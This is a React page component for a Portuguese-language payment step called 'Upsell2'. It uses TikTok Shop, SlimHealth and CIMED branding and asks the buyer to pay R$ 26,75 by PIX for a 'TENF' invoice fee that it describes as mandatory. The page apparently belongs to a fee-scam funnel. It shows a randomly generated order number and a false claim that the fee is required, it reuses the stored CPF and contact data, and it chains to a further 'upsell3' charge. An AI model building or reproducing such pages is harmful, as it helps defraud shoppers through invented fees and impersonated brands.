import { useState, useEffect, useMemo } from "react";
import { useNavigate } from "react-router-dom";
import { CreditCard, Info, HelpCircle } from "lucide-react";
import { toast } from "sonner";
import { Button } from "@/components/ui/button";
import { PixPaymentModal } from "@/components/PixPaymentModal";
import { useParadisePix } from "@/hooks/useParadisePix";
import tiktokLogo from "@/assets/upsell/tiktok-shop.png";
import slimhealthLogo from "@/assets/slimhealth-logo.png";
import cimedLogo from "@/assets/cimed-logo.png";

const UPSELL_AMOUNT = 26.75;
const UPSELL_DESCRIPTION = "TENF - Taxa de Nota Fiscal";

const Upsell2Page = () => {
  const navigate = useNavigate();
  const [showModal, setShowModal] = useState(false);
  const [dadosPessoais, setDadosPessoais] = useState<{
    nome: string;
    email: string;
    cpf: string;
    telefone: string;
  } | null>(null);

  const {
    isLoading,
    error,
    qrCode,
    qrCodeBase64,
    paymentStatus,
    createPixPayment,
    startPolling,
    stopPolling,
    reset,
  } = useParadisePix();

  // Gerar número de pedido aleatório uma vez
  const orderNumber = useMemo(() => {
    return String(Math.floor(Math.random() * 90000) + 10000).padStart(8, '0');
  }, []);

  // Load customer data
  useEffect(() => {
    const dadosSalvos = localStorage.getItem('dadosPessoais');
    if (dadosSalvos) {
      setDadosPessoais(JSON.parse(dadosSalvos));
    }
  }, []);

  const handleOpenModal = async () => {
    setShowModal(true);
    
    if (!dadosPessoais) {
      toast.error("Dados do cliente não encontrados");
      return;
    }

    const customer = {
      name: dadosPessoais.nome,
      email: dadosPessoais.email,
      document: dadosPessoais.cpf,
      phone: dadosPessoais.telefone,
    };

    const success = await createPixPayment(
      UPSELL_AMOUNT,
      UPSELL_DESCRIPTION,
      customer,
      `upsell2_${Date.now()}`
    );

    if (success) {
      startPolling(() => {
        toast.success("Pagamento confirmado!");
        setShowModal(false);
        navigate('/upsell3');
      });
    }
  };

  const handleCloseModal = () => {
    stopPolling();
    setShowModal(false);
  };

  const handleRetry = () => {
    reset();
    handleOpenModal();
  };

  return (
    <div className="min-h-screen bg-white flex flex-col">
      {/* Header com Logo TikTok Shop - sem borda */}
      <div className="bg-white px-4 py-4 flex justify-center">
        <img src={tiktokLogo} alt="TikTok Shop" className="h-10 w-auto" />
      </div>

      {/* Content */}
      <div className="flex-1 flex flex-col items-center p-4">
        <div className="w-full max-w-md space-y-4">
          
          {/* Card 1 - Status do Pedido */}
          <div className="bg-white rounded-2xl shadow-lg p-6">
            <div className="flex items-start gap-4">
              <div className="w-12 h-12 rounded-full flex items-center justify-center flex-shrink-0
                bg-gradient-to-br from-rose-100 via-rose-50 to-rose-200
                shadow-[0_4px_12px_rgba(244,63,94,0.25),inset_0_2px_4px_rgba(255,255,255,0.8),inset_0_-2px_4px_rgba(244,63,94,0.15)]
                border border-rose-200/50">
                <CreditCard className="w-6 h-6 text-rose-500 drop-shadow-sm" />
              </div>
              <div className="flex-1">
                <h2 className="font-semibold text-[#1a1a2e] text-lg mb-3">Status do Pedido</h2>
                <div className="space-y-2 text-sm text-gray-600">
                  <p><span className="font-medium text-gray-700">Número do pedido:</span> {orderNumber}</p>
                  <p><span className="font-medium text-gray-700">Status:</span> Aguardando pagamento</p>
                  <p><span className="font-medium text-gray-700">Valor da TENF:</span> R$ 26,75</p>
                </div>
              </div>
            </div>
          </div>

          {/* Card 2 - Pagamento Pendente */}
          <div className="bg-white rounded-2xl shadow-lg p-6">
            <div className="flex items-start gap-4">
              <div className="w-12 h-12 rounded-full flex items-center justify-center flex-shrink-0
                bg-gradient-to-br from-rose-100 via-rose-50 to-rose-200
                shadow-[0_4px_12px_rgba(244,63,94,0.25),inset_0_2px_4px_rgba(255,255,255,0.8),inset_0_-2px_4px_rgba(244,63,94,0.15)]
                border border-rose-200/50">
                <Info className="w-6 h-6 text-rose-500 drop-shadow-sm" />
              </div>
              <div className="flex-1">
                <h2 className="font-semibold text-[#1a1a2e] text-lg mb-2">Pagamento Pendente</h2>
                <p className="text-sm text-gray-600 leading-relaxed">
                  Seu pedido está quase pronto para ser enviado! Para finalizar, realize o pagamento da TENF no valor de <strong>R$ 26,75</strong>.
                </p>
              </div>
            </div>
          </div>

          {/* Botão Pagar TENF */}
          <Button
            onClick={handleOpenModal}
            className="w-full bg-gradient-to-r from-rose-500 to-rose-600 hover:from-rose-600 hover:to-rose-700 text-white font-bold py-4 rounded-xl shadow-lg text-lg h-auto"
          >
            PAGAR TENF - R$ 26,75
          </Button>

          {/* Card 3 - Por que preciso pagar? */}
          <div className="bg-white rounded-2xl shadow-lg p-6">
            <div className="flex items-start gap-4">
              <div className="w-12 h-12 rounded-full flex items-center justify-center flex-shrink-0
                bg-gradient-to-br from-rose-100 via-rose-50 to-rose-200
                shadow-[0_4px_12px_rgba(244,63,94,0.25),inset_0_2px_4px_rgba(255,255,255,0.8),inset_0_-2px_4px_rgba(244,63,94,0.15)]
                border border-rose-200/50">
                <HelpCircle className="w-6 h-6 text-rose-500 drop-shadow-sm" />
              </div>
              <div className="flex-1">
                <h2 className="font-semibold text-[#1a1a2e] text-lg mb-2">Por que preciso pagar a TENF?</h2>
                <p className="text-sm text-gray-600 leading-relaxed">
                  A TENF é uma taxa obrigatória para emissão da nota fiscal. Após o pagamento, seu pedido será enviado em até 24 horas.
                </p>
              </div>
            </div>
          </div>

          {/* Logos SlimHealth + CIMED */}
          <div className="flex items-center justify-center gap-3 mt-6 mb-8">
            <img 
              src={slimhealthLogo} 
              alt="SlimHealth" 
              className="h-7 object-contain opacity-70"
            />
            <span className="text-lg font-bold text-muted-foreground">+</span>
            <img 
              src={cimedLogo} 
              alt="CIMED" 
              className="h-5 object-contain opacity-70"
            />
          </div>
        </div>
      </div>

      {/* Modal de Pagamento PIX */}
      <PixPaymentModal
        isOpen={showModal}
        onClose={handleCloseModal}
        title="TENF"
        amount={UPSELL_AMOUNT}
        qrCode={qrCode}
        qrCodeBase64={qrCodeBase64}
        isLoading={isLoading}
        paymentStatus={paymentStatus}
        error={error}
        onRetry={handleRetry}
      />
    </div>
  );
};

export default Upsell2Page;
